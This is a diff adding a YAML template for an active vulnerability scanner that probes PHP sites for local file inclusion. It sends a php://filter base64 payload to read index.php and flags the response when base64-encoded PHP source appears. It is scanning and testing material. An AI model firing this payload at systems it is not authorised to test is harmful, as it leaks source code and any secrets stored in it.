@@ -1,0 +1,22 @@
+id: patt-lfi-wrap-filter-01-file
+name: 'PATT lfi patt-lfi-wrap-filter-01 via file'
+severity: high
+type: active
+tags:
+  - lfi
+  - patt
+  - wrapperphp
+requires:
+  - php
+description: 'PATT php://filter base64 (read PHP source without execution). [patt:patt-lfi-wrap-filter-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Wrappers.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      file:
+        - 'php://filter/convert.base64-encode/resource=index.php'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PD9waHA'
